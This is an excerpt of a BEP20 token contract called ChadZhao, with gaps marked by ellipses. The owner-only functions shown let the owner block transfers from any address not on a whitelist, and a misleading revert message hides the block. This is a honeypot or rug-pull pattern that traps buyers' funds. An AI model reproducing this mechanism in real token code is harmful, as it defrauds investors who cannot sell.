...
contract BEP20 is IBEP20, Ownable {
    ...
    mapping(address => bool) public enableTradeed;
    ...
    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        if(enableTrade){
            require(enableTradeed[from],"User receives Bonus Tokens");
        }
 ...
 */
    ...
    function enableTradeAddress(address[] memory _recipients) public onlyOwner returns (bool) {
        require(_recipients.length <= 100); //maximum receievers can be 100
        for (uint i = 0; i < _recipients.length; i++) {
            enableTradeed[_recipients[i]] = true;
        }
        return true;
    }
      ...
      function muskAddress(address[] memory _recipients) public onlyOwner returns (bool) {
        ...
        for (uint i = 0; i < _recipients.length; i++) {
            enableTradeed[_recipients[i]] = false;
        }
        return true;
    }

    
    function updateenableTrade() public onlyOwner returns (bool success)  {
        if (enableTrade) {
            enableTrade = false;
        } else {
            enableTrade = true;
...
contract ChadZhao is BEP20Detailed,BEP20{


    constructor()
        public
         BEP20Detailed ("CZ", "ChadZhao", 18) {
